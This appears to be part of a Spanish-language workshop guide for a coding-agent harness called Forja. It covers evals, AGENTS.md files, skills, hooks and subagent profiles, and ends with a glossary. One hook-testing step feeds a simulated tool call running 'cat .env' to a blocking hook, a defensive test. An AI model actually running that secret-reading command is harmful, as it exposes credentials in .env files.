2. `python scripts/tasks.py evals --only fix_rounding` → una línea FAIL muestra como motivo las últimas 3 líneas de la salida de pytest. Fíjate en que tu `playground/` real nunca se modifica.
3. `python scripts/tasks.py evals --repeat 3` (las 5 tareas × 3; tarda un rato en un portátil — lánzalo y sigue leyendo). Mira `per_task`: ¿qué tareas son inestables (0.33, 0.67)?
4. Si tienes un segundo modelo: `python scripts/tasks.py evals --model qwen3-coder:30b --repeat 3` (o el servidor del aula con `--backend openai_compat`). Abre los dos ficheros `out/evals_*.json` y compara `pass_rate`, `avg_steps`, `avg_seconds`, `total_tokens`.
5. Inspecciona un fallo: en el JSON, `results[i].answer` (primeros 500 caracteres) y `stop_reason` (`max_steps`, `loop`, `error`…) suelen decirte por qué.

### Si algo falla
| Síntoma | Causa → solución |
|---|---|
| `grade(...) == (True, 'ok')` falla con `(False, 'modified files…')` en el test de forbid | Copiaste los ficheros ocultos o ejecutaste el comando antes de la comprobación `forbid_changes`, o comparaste contra una instantánea nueva → comprueba primero `snapshot(workdir) != before`. |
| `test_grade_answer_and_forbid_changes`: 'the answer is missing: [VAT]' | La comparación distingue mayúsculas → aplica `norm()` tanto al string esperado como a la respuesta. |
| `test_hidden_tests_copied_after`: el fichero oculto no existe | Vuelves antes de copiar, o solo copias si hay éxito → copia los ficheros ocultos antes de ejecutar el comando, sea cual sea el resultado. |
| `test_run_task_pass_and_fail`: `ok.passed` es False / `steps != 5` | Labs anteriores están rotos en tu harness (edit_file, bash, permisos en bypass) → ejecuta `python scripts/tasks.py test 03` y `test 04`; o `catchup 12` si vas justo de tiempo. |
| Todas las evals reales dan FAIL con `EXCEPTION …` o `stop_reason: error` | El backend no es accesible o el modelo no está descargado → `forja doctor`, `ollama list`, revisa `.env`. |
| Windows: `check failed: 'python' is not recognized…` | El comando de comprobación se ejecuta con cmd.exe y el venv no está activo en ese terminal → `.venv\Scripts\activate` antes de ejecutar las evals. |
| `StatisticsError: mean requires at least one data point` | `--only` con un id desconocido da cero resultados → protege las listas vacías en `summarize` (y revisa cómo se escribe el id). |
| Los resultados varían mucho entre ejecuciones | Los modelos no son deterministas → compara siempre con `--repeat 3` o más y mira `per_task`, no una sola ejecución. |

### Has terminado cuando
- [ ] [ ] `python scripts/tasks.py test 12` → 5 passed.
- [ ] [ ] Tienes al menos un `out/evals_<model>.json` generado con `--repeat 3`.
- [ ] [ ] Puedes decir, con números (tasa de aciertos, pasos, segundos, tokens), qué modelo usarías para qué tareas.

### Proyecto final paso a paso

Proyecto final (16:00–17:00): personaliza Forja para tu forma de trabajar y demuéstralo con números. Cinco entregables, todos pequeños. Trabaja en `playground/` (o en un repo real tuyo para 1–4) y lleva una lista corta de `NOTES` con lo que cambiaste para la demo de 3 minutos. Presupuesto: ~10 min por entregable, 15 min para las evals.

#### AGENTS.md: preferencias globales + uno por repo

**Dónde:** Global: `~/.forja/AGENTS.md` (macOS/Linux) · `%USERPROFILE%\.forja\AGENTS.md` (Windows; en PowerShell `$HOME\.forja\AGENTS.md`). Proyecto: `AGENTS.md` (o `FORJA.md`) en la raíz del repo; los ficheros se recogen desde la raíz del sistema de ficheros hasta `--cwd`, primero el global, así que el más cercano es el más específico.

1. Crea la carpeta: macOS/Linux `mkdir -p ~/.forja` · PowerShell `New-Item -ItemType Directory -Force $HOME\.forja`.
2. Escribe 5–10 viñetas de preferencias PERSONALES (idioma, verbosidad, hábitos de testing). Que sea breve: se envía en cada turno.
3. En un repo real tuyo, escribe `AGENTS.md` con: cómo ejecutar los tests, el comando de build/lint, las convenciones y las cosas que nunca deben hacerse.
4. Comprueba que se carga: arranca `forja --cwd <repo>` y pregunta `which instructions are you following?` — debería citar ambas capas (el prompt contiene `## User global instructions` y `## Project instructions (AGENTS.md)`).

<details><summary>📄 Plantilla</summary>

```markdown
# AGENTS.md — <project>

- Stack: <language/version>, <framework>.
- Tests: `<command>`. Run them after every code change.
- Lint/format: `<command>`.
- Conventions: <naming, error handling, logging>.
- Never: <edit generated files / touch migrations / change public APIs without asking>.
- When unsure, ask before large refactors.
```

</details>

> ⚠️ Las evals se ejecutan con un home temporal, así que `run_evals.py` NO usa `~/.forja/AGENTS.md`; solo `playground/AGENTS.md` (copiado con el proyecto). Si quieres medir un cambio en las instrucciones, ponlo en `playground/AGENTS.md`.

#### Una skill de equipo

**Dónde:** `<project>/.forja/skills/<skill-name>/SKILL.md` (proyecto) o `~/.forja/skills/<skill-name>/SKILL.md` (personal; si coinciden los nombres gana el proyecto). Los ficheros extra (scripts, plantillas) pueden vivir en la misma carpeta: la herramienta `skill` le dice al modelo la ruta de la carpeta.

1. Elige un procedimiento que expliques una y otra vez: checklist de release, rúbrica de code review, cómo añadir un endpoint, pasos de migración de BD…
2. Escribe el frontmatter: `name` (kebab-case, = nombre de la carpeta) y una `description` que diga QUÉ es y CUÁNDO cargarla.
3. Escribe el cuerpo como pasos numerados con comandos exactos. Mantenlo por debajo de ~60 líneas.
4. Comprueba el descubrimiento: `/tools` muestra `skill`, y un prompt que la necesite produce `⏺ skill <name>` como una de las primeras llamadas.

<details><summary>📄 Plantilla</summary>

```markdown
---
name: add-endpoint
description: How to add a REST endpoint in this repo (routing, validation, tests). Load it before creating or changing an endpoint.
---
# Adding an endpoint

1. Route in `<file>`; handler in `<folder>/<name>.py`.
2. Validate input with <library>; return <error format> on failure.
3. Add a test in `tests/<...>` covering success and one error.
4. Run `<test command>` before finishing.
```

</details>

> ⚠️ Si el modelo nunca la carga, la descripción es demasiado vaga. Di cuándo: 'Load it before …'. Mira `examples/project/.forja/skills/conventional-commits/SKILL.md`.

#### Un hook que garantiza algo que ahora pides por favor

**Dónde:** Script en `<project>/.forja/hooks/<name>.py`; registro en `<project>/.forja/settings.json` bajo `hooks.<Event>` (`PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`). Los comandos se ejecutan con `cwd` = raíz del proyecto a través del shell (cmd.exe en Windows).

1. Elige el evento: bloquear algo → `PreToolUse`; dar feedback tras una edición (lint, compilación, comprobación de formato) → `PostToolUse`; 'no termines hasta X' → `Stop`; inyectar contexto o filtrar prompts → `UserPromptSubmit`.
2. Escribe el script: lee el evento con `json.load(sys.stdin)` (`tool_name`, `tool_input`, y `tool_response` para PostToolUse; `prompt` para UserPromptSubmit), decide, imprime el motivo en stderr y haz `sys.exit(2)` para bloquear/dar feedback, `sys.exit(0)` en caso contrario.
3. Regístralo con un `matcher` regex (coincidencia completa con el nombre de la herramienta, p. ej. `edit_file|write_file`, `bash`, `mcp__issues__.*`); omite el matcher para aplicarlo a todas.
4. Prueba primero el script solo. macOS/Linux: `echo '{"tool_name":"bash","tool_input":{"command":"cat .env"}}' | python .forja/hooks/<name>.py; echo $?` · PowerShell: `'{"tool_name":"bash","tool_input":{"command":"cat .env"}}' | python .forja\hooks\<name>.py; $LASTEXITCODE`.
5. Después dispáralo desde el CLI y comprueba que ves `BLOCKED by hook: …` (Pre) o `[hook PostToolUse] …` en el resultado de la herramienta (Post).

<details><summary>📄 Plantilla</summary>

```python
"""PostToolUse (edit_file|write_file): <what it guarantees>. Exit 2 = feedback to the model."""
import json, subprocess, sys

event = json.load(sys.stdin)
path = event.get("tool_input", {}).get("path", "")
if not path.endswith(".py"):
    sys.exit(0)
p = subprocess.run(["ruff", "check", "--quiet", path], capture_output=True, text=True)
if p.returncode != 0:
    print(f"Lint errors in {path}:\n{p.stdout[-2000:]}", file=sys.stderr)
    sys.exit(2)
sys.exit(0)
```
```json
"hooks": {"PostToolUse": [{"matcher": "edit_file|write_file", "command": "python .forja/hooks/lint.py", "timeout": 30}]}
```

</details>

> ⚠️ La salida 1 NO bloquea (se registra como error del hook y se ignora): usa la salida 2. Un hook `Stop` lento se ejecuta en cada respuesta final — que sea rápido (`-x`, un subconjunto de tests).

#### Un perfil de subagente especializado

**Dónde:** `<project>/.forja/agents/<name>.md`. Claves de frontmatter que lee `load_profiles`: `name`, `description` (obligatorias), `tools` (lista o string `a, b`; por defecto `read_file, grep, glob`), `max_steps` (por defecto 25). Nombres de herramienta válidos: `read_file`, `write_file`, `edit_file`, `glob`, `grep`, `bash`, `todo_write`, `skill`, `mcp__<server>__<tool>` (`task` se elimina siempre). El cuerpo es su system prompt.

1. Elige un trabajo acotado en el que ayude un contexto limpio: triaje de tests fallidos, revisión de seguridad, redactor de documentación, auditor de dependencias, un `tester` que solo ejecuta pytest.
2. Dale las herramientas MÍNIMAS. Roles de solo lectura: `read_file, grep, glob` (+ `bash` si necesita `git diff`/pytest, y añade las reglas `allow` correspondientes en settings).
3. Escribe la descripción desde el punto de vista del agente principal: qué hace y cuándo delegar en él.
4. Escribe el cuerpo: rol, método (numerado) y el formato de salida exacto que quieres recibir (es lo único que verá el agente principal).
5. Comprueba: el perfil aparece en la descripción de la herramienta `task`; pide `use the <name> subagent to …` y busca llamadas con prefijo `[<name>]`.

<details><summary>📄 Plantilla</summary>

```markdown
---
name: tester
description: Runs the test suite and explains failures with the likely cause and file:line. Use it after code changes or when tests fail.
tools: read_file, grep, glob, bash
max_steps: 15
---
You are a test triage specialist. Only run `python -m pytest` commands with bash; never modify files.
1. Run the suite (`python -m pytest -q -x`).
2. For each failure, read the test and the code under test.
Answer with: a one-line verdict, then per failure `test name — cause — path:line — suggested fix (1 sentence)`.
```

</details>

> ⚠️ La restricción de herramientas es por NOMBRE; un subagente con `bash` puede ejecutar cualquier comando que tus permisos permitan. Para restringir comandos, apóyate en las reglas `allow`/`deny` (p. ej. `bash(python -m pytest*)`) y en las aprobaciones — las llamadas del subagente pasan por la misma puerta que las del agente principal.

#### Una tarea de eval para tu trabajo diario + un informe de 2 modelos

**Dónde:** Añade la tarea a `evals/tasks.yaml` (al FINAL: `test_tasks_file` espera que `fix_rounding` y `fix_due_date` sigan siendo las primeras). Los tests ocultos van en `evals/hidden/` y se referencian como `{"evals/hidden/<file>.py": "tests/<dest>.py"}`. Los informes van a `out/evals_<model>.json`. Las tareas siempre se ejecutan sobre una copia de `playground/`, así que expresa tu trabajo diario sobre el proyecto de facturas.

1. Elige un tipo de tarea que hagas cada semana: un bug fix pequeño, una feature con tests, un refactor que debe mantener los tests en verde, o una pregunta sobre el código.
2. Escribe el prompt como un ticket (qué, no cómo). Elige una comprobación OBJETIVA: `command` (tests), `hidden` (tests que el agente no puede ver — lo mejor para features), `answer_contains` (+ `forbid_changes: true` para preguntas).
3. Para una comprobación `hidden`, escribe el fichero de test oculto en `evals/hidden/` y verifica que FALLA sobre el playground sin tocar (si no, la tarea no mide nada).
4. Ejecútala sola: `python scripts/tasks.py evals --only <id> --repeat 3`. Itera el prompt/la comprobación hasta que un pass signifique 'hecho bien'.
5. Ejecuta la misma tarea (o la suite completa) con dos modelos: `python scripts/tasks.py evals --model qwen3:8b --repeat 3` y `python scripts/tasks.py evals --model qwen3-coder:30b --repeat 3` (o `--backend openai_compat` / `--backend openrouter --model <open-weight model>`).
6. Escribe el informe: una tabla a partir de los dos ficheros JSON (pass rate, per_task de tu tarea, avg steps, avg seconds, total tokens) + 2–3 frases de conclusión.

<details><summary>📄 Plantilla</summary>

```yaml
- id: my_overdue_flag
  prompt: "Add a method Invoice.is_overdue(today) that returns True when today is after the due date. Add a test."
  check: {command: "python -m pytest -q tests/test_overdue_hidden.py", hidden: {"evals/hidden/test_overdue.py": "tests/test_overdue_hidden.py"}}

- id: my_question
  prompt: "Without modifying anything: where is the due date computed and what happens on weekends?"
  check: {answer_contains: ["dates.py", "due_date"], forbid_changes: true}
```
Esqueleto del informe (Markdown):
```markdown
| model | pass rate | my task | avg steps | avg s | tokens |
|---|---|---|---|---|---|
| qwen3:8b | 0.60 | 0.33 | 9.1 | 41.0 | 120k |
| qwen3-coder:30b | … | … | … | … | … |

Conclusion: <which model for which task, and why>.
```
Para imprimir los números: `python -c "import json,glob; [print(r['model'], r['pass_rate'], r['per_task'], r['avg_steps'], r['avg_seconds'], r['total_tokens']) for r in map(lambda f: json.load(open(f, encoding='utf-8')), glob.glob('out/evals_*.json'))]"`

</details>

> ⚠️ Por defecto `run_task` copia el playground SIN `.forja/` (solo cuenta `playground/AGENTS.md`). Para medir tu configuración ejecuta dos veces y compara: `python scripts/tasks.py evals --repeat 3 --label base` y `python scripts/tasks.py evals --repeat 3 --config playground/.forja --label config`. `~/.forja/AGENTS.md` nunca se usa (home temporal). Las rutas MCP de `settings.json` se resuelven desde la copia temporal: usa rutas absolutas con `--mcp`.

#### Demo de 3 minutos
1. 3 minutos por persona/pareja: 30 s qué has añadido (enseña los ficheros), 90 s un prompt en directo donde se vea actuar una skill/hook/subagente, 60 s la tabla de evals y tu conclusión.
2. Trae números, no impresiones: 'la tasa de aciertos en mi tarea pasó de 0.33 a 1.0 con qwen3-coder:30b a 2× el tiempo'.

#### Has terminado cuando
- [ ] [ ] Existen el `AGENTS.md` global y el de proyecto, y el agente puede citarlos.
- [ ] [ ] El agente carga una skill (`⏺ skill <name>`) cuando procede.
- [ ] [ ] Un hook bloquea o da feedback de forma visible (`BLOCKED by hook` / `[hook PostToolUse]`).
- [ ] [ ] Un perfil de subagente aparece en la descripción de `task` y se usa (llamadas `[<name>]`).
- [ ] [ ] Una tarea nueva en `evals/tasks.yaml`, `python scripts/tasks.py test 12` sigue pasando, y dos informes `out/evals_*.json` comparados en una tabla.

### Checkpoint
Tienes un informe en `out/` y puedes decir, con números, qué modelo usarías y para qué tareas.

### Retos
1. Añade una tarea propia a `evals/tasks.yaml`.
2. Compara tu harness con y sin `todo_write` en el prompt base.

**Tests:** `tests/test_l12_evals.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup end`


---

## Proyecto final (día 2, 16:00–17:00): tu Forja

Personaliza tu agente para tu forma de trabajar y demuéstralo con números:

1. `~/.forja/AGENTS.md` con tus preferencias y un `AGENTS.md` para un repo real tuyo.
2. Una **skill** de tu equipo (convenciones, despliegue, revisión…).
3. Un **hook** que garantice algo que hoy pides por favor (tests, linter, secretos).
4. Un **subagente** especializado.
5. Una **tarea de eval** que represente tu trabajo diario, y el informe comparando dos modelos.

Demo de 3 minutos por persona o pareja: qué has añadido y qué ha cambiado en las evals.

---

## Glosario
- **Agente** — Modelo + tools + bucle que decide y actúa hasta terminar una tarea.
- **Harness** — Todo lo que rodea al bucle: permisos, contexto, interfaz, hooks, sesiones.
- **Tool call** — Petición estructurada (nombre + argumentos JSON) que el modelo hace al harness. El modelo no ejecuta nada.
- **Streaming** — Recibir la respuesta en trozos según se genera.
- **Ventana de contexto** — Máximo de tokens que el modelo ve a la vez.
- **Compactación** — Reducir el historial (vaciar salidas antiguas, resumir) para que quepa.
- **Modo plan** — Modo de solo lectura en el que el agente propone un plan antes de actuar.
- **Subagente** — Agente lanzado por otro con contexto limpio y tools restringidas.
- **Hook** — Comando que el harness ejecuta en un punto fijo; puede bloquear (exit 2).
- **Skill** — Instrucciones que se cargan bajo demanda; en el prompt solo va su descripción.
- **MCP** — Protocolo estándar para conectar herramientas externas a un agente.
- **Eval** — Tarea con comprobación objetiva para medir un agente o un modelo.
